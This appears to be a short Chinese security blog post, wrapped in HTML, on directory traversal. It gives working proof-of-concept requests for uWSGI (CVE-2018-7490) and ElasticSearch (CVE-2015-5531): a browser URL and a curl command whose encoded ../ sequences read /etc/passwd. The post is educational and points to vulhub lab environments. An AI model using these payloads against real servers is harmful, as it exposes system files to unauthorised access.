@@ -1,0 +1,474 @@
+<!DOCTYPE html>
+<html>
+<head>
+    
+
+    
+
+    
+
+
+
+    <meta charset="utf-8">
+    
+    
+    
+    <title>目录穿越几则 | 个人成长</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#3F51B5">
+    
+    
+    <meta name="keywords" content="Web Security">
+    <meta name="description" content="基础知识目录穿越简单理解就是对于../没有做严格限制，攻击者可以通过../访问敏感信息。 URL编码和ASCII字符 %2F       / %20      空格 %3F      ？ 命令行下，curl 发送URL请求 Burpsuite Repeater模块发送各种请求Payload 实例uWSGI PHP目录穿越漏洞 （CVE-2018-7490） 影响版本：2.0.17之前 uWSGI是">
+<meta name="keywords" content="Web Security">
+<meta property="og:type" content="article">
+<meta property="og:title" content="目录穿越几则">
+<meta property="og:url" content="darktemple9.github.io/2018/05/25/目录穿越几则/index.html">
+<meta property="og:site_name" content="个人成长">
+<meta property="og:description" content="基础知识目录穿越简单理解就是对于../没有做严格限制，攻击者可以通过../访问敏感信息。 URL编码和ASCII字符 %2F       / %20      空格 %3F      ？ 命令行下，curl 发送URL请求 Burpsuite Repeater模块发送各种请求Payload 实例uWSGI PHP目录穿越漏洞 （CVE-2018-7490） 影响版本：2.0.17之前 uWSGI是">
+<meta property="og:updated_time" content="2018-05-25T03:13:23.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="目录穿越几则">
+<meta name="twitter:description" content="基础知识目录穿越简单理解就是对于../没有做严格限制，攻击者可以通过../访问敏感信息。 URL编码和ASCII字符 %2F       / %20      空格 %3F      ？ 命令行下，curl 发送URL请求 Burpsuite Repeater模块发送各种请求Payload 实例uWSGI PHP目录穿越漏洞 （CVE-2018-7490） 影响版本：2.0.17之前 uWSGI是">
+    
+        <link rel="alternate" type="application/atom+xml" title="个人成长" href="/atom.xml">
+    
+    <link rel="shortcut icon" href="/favicon.ico">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+
+</head>
+
+<body>
+    <div id="loading" class="active"></div>
+
+    <aside id="menu" class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">darktemple9</h5>
+          <a href="mailto:rxzhou9@sina.com" title="rxzhou9@sina.com" class="mail">rxzhou9@sina.com</a>
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="waves-block waves-effect">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                主页
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                Archives
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                Tags
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                Categories
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://github.com/darktemple9" target="_blank" >
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="http://www.weibo.com/darktemple9" target="_blank" >
+                <i class="icon icon-lg icon-weibo"></i>
+                Weibo
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">目录穿越几则</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="Search">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
+            <i class="icon icon-lg icon-share-alt"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+
+    <div class="container fade-scale">
+        <h1 class="title">目录穿越几则</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2018-05-25T01:53:53.000Z" itemprop="datePublished" class="page-time">
+  2018-05-25
+</time>
+
+
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/Security/">Security</a></li></ul>
+
+            
+        </h5>
+    </div>
+
+    
+
+
+</header>
+
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#基础知识"><span class="post-toc-number">1.</span> <span class="post-toc-text">基础知识</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#实例"><span class="post-toc-number">2.</span> <span class="post-toc-text">实例</span></a></li></ol>
+        </nav>
+    </aside>
+
+
+<article id="post-目录穿越几则"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">目录穿越几则</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2018-05-25 09:53:53" datetime="2018-05-25T01:53:53.000Z"  itemprop="datePublished">2018-05-25</time>
+
+            
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/Security/">Security</a></li></ul>
+
+
+
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
+</span>
+
+
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><p>目录穿越简单理解就是对于../没有做严格限制，攻击者可以通过../访问敏感信息。</p>
+<p>URL编码和ASCII字符</p>
+<p>%2F       /</p>
+<p>%20      空格</p>
+<p>%3F      ？</p>
+<p>命令行下，curl 发送URL请求</p>
+<p>Burpsuite Repeater模块发送各种请求Payload</p>
+<h1 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h1><p>uWSGI PHP目录穿越漏洞 （CVE-2018-7490）</p>
+<p>影响版本：2.0.17之前</p>
+<p>uWSGI是一款Web应用程序服务器，在2.0.17之前没有正确处理DOCUMENT_ROOT导致用户可以利用../来跨域目录，读取DOCUMENT_ROOT目录以外的文件。</p>
+<p>直接浏览器访问：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://your-ip:8080/..%2f..%2f..%2f..%2f..%2fetc/passwd</span><br></pre></td></tr></table></figure>
+<p>ElasticSearch 目录穿越漏洞（CVE-2015-5531）</p>
+<p><a href="http://vulhub.org/#/environments/elasticsearch/CVE-2015-5531/" target="_blank" rel="noopener">http://vulhub.org/#/environments/elasticsearch/CVE-2015-5531/</a></p>
+<p><a href="https://www.exploit-db.com/exploits/38383/" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/38383/</a></p>
+<p>影响版本：v1.6.1以下</p>
+<p>ElasticSearch是一个基于分布式多用户能力的全文搜索引擎，基于Restful web接口。支持通过HTTP使用JSON进行数据索引。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://your-ip:9200/_snapshot/test/backdata%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd</span><br></pre></td></tr></table></figure>
+<p>ZipperDown IOS目录穿越</p>
+<p>最近几天比较火的漏洞，算是ZipArchive包没限制../的一个问题吧。目前还没看到POC，持续关注中。。。</p>
+
+        </div>
+
+        <blockquote class="post-copyright">
+    
+    <div class="content">
+        
+<span class="post-time">
+    Last updated: <time datetime="2018-05-25T03:13:23.000Z" itemprop="dateUpdated">2018-05-25 11:13:23</time>
+</span><br>
+
+
+        
+        这里可以写作者留言，标签和 hexo 中所有变量及辅助函数等均可调用，示例：<a href="/2018/05/25/目录穿越几则/" target="_blank" rel="external">darktemple9.github.io/2018/05/25/目录穿越几则/</a>
+        
+    </div>
+    
+    <footer>
+        <a href="darktemple9.github.io">
+            <img src="/img/avatar.jpg" alt="darktemple9">
+            darktemple9
+        </a>
+    </footer>
+</blockquote>
+
+        
+
+
+        <div class="post-footer">
+            
+	<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web-Security/">Web Security</a></li></ul>
+
+
+            
+<div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=darktemple9.github.io/2018/05/25/目录穿越几则/&title=《目录穿越几则》 — 个人成长&pic=darktemple9.github.io/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=darktemple9.github.io/2018/05/25/目录穿越几则/&title=《目录穿越几则》 — 个人成长&source=" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=darktemple9.github.io/2018/05/25/目录穿越几则/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《目录穿越几则》 — 个人成长&url=darktemple9.github.io/2018/05/25/目录穿越几则/&via=darktemple9.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=darktemple9.github.io/2018/05/25/目录穿越几则/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between flex-row-reverse">
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/2018/05/23/dns域传送漏洞/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">dns域传送漏洞</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</article>
+
+
+
+</div>
+
+        <footer class="footer">
+    <div class="top">
+        
+<p>
+    <span id="busuanzi_container_site_uv" style='display:none'>
+        站点总访客数：<span id="busuanzi_value_site_uv"></span>
+    </span>
+    <span id="busuanzi_container_site_pv" style='display:none'>
+        站点总访问量：<span id="busuanzi_value_site_pv"></span>
+    </span>
+</p>
+
+
+        <p>
+            
+                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
+            
+            <span>This blog is licensed under a <a rel="license" href="https://creativecommons.org/licenses/by/4.0/">Creative Commons Attribution 4.0 International License</a>.</span>
+        </p>
+    </div>
+    <div class="bottom">
+        <p><span>darktemple9 &copy; 2015 - 2018</span>
+            <span>
+                
+                Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
+            </span>
+        </p>
+    </div>
+</footer>
+
+    </main>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=darktemple9.github.io/2018/05/25/目录穿越几则/&title=《目录穿越几则》 — 个人成长&pic=darktemple9.github.io/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=darktemple9.github.io/2018/05/25/目录穿越几则/&title=《目录穿越几则》 — 个人成长&source=" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=darktemple9.github.io/2018/05/25/目录穿越几则/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《目录穿越几则》 — 个人成长&url=darktemple9.github.io/2018/05/25/目录穿越几则/&via=darktemple9.github.io" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=darktemple9.github.io/2018/05/25/目录穿越几则/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="//api.qrserver.com/v1/create-qr-code/?data=darktemple9.github.io/2018/05/25/目录穿越几则/" alt="微信分享二维码">
+</div>
+
+
+
+
+    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: false };
+
+
+</script>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>
+
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item">
+    <a href="{path}" class="waves-block waves-effect">
+        <div class="title ellipsis" title="{title}">{title}</div>
+        <div class="flex-row flex-middle">
+            <div class="tags ellipsis">
+                {tags}
+            </div>
+            <time class="flex-col time">{date}</time>
+        </div>
+    </a>
+</li>
+</template>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>
+
+
+
+
+
+
+<script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+<script>
+(function() {
+    var OriginTitile = document.title, titleTime;
+    document.addEventListener('visibilitychange', function() {
+        if (document.hidden) {
+            document.title = '离开本站点！';
+            clearTimeout(titleTime);
+        } else {
+            document.title = '(つェ⊂)咦!又好了!';
+            titleTime = setTimeout(function() {
+                document.title = OriginTitile;
+            },2000);
+        }
+    });
+})();
+</script>
+
+
+
+</body>
+</html>
